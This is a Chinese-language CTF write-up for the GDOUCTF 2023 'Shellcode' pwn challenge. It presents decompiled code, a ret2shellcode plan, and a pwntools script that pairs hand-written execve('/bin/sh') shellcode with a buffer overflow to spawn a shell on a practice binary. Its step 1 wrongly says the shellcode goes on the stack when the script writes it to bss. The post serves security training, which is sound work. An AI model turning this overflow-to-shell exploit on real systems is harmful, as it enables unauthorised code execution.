---
title: '[GDOUCTF 2023] Shellcode'
date: 2024-08-17 13:00:00 +0800
categories: [ctf,pwn]
tags: [ret2shellcode,shellcode]
---

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[10]; // [rsp+6h] [rbp-Ah] BYREF

  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  setbuf(stdout, 0LL);
  mprotect((&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
  puts("Please.");
  read(0, &name, 37uLL);                        // bss
  puts("Nice to meet you.");
  puts("Let's start!");
  read(0, buf, 0x40uLL);		//溢出点
  return 0;
}
```

程序逻辑:

1. 第一个`read()`接收数据并保存到位于`bss`段上的`name`
2. 第二个`read()`接受数据并保存到栈上`buf`变量

利用思路:

1. 利用第一个`read()`往栈上写入`shellcode`
2. 利用第二个`read()`溢出跳转到`&name`调用`shellcode`完成利用

exp:

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
io = gdb.debug('./ezshellcode')
name_addr = 0x6010a0
shellcode = '''
xor rdx,rdx;
push rdx;
mov rsi,rsp;
mov rax,0x68732f2f6e69622f;
push rax;
mov rdi,rsp;
mov rax,59;
syscall;
'''
io.sendlineafter(b'Please.',asm(shellcode))
io.sendlineafter(b'start!',b'A'*18+p64(name_addr))

io.interactive()
```

tips:

第一段输入的`shellcode`被限制在`32`字节之内,所以不能用`pwntools`自带的`shellcode`生成器,需要找一个更短的`shellcode`
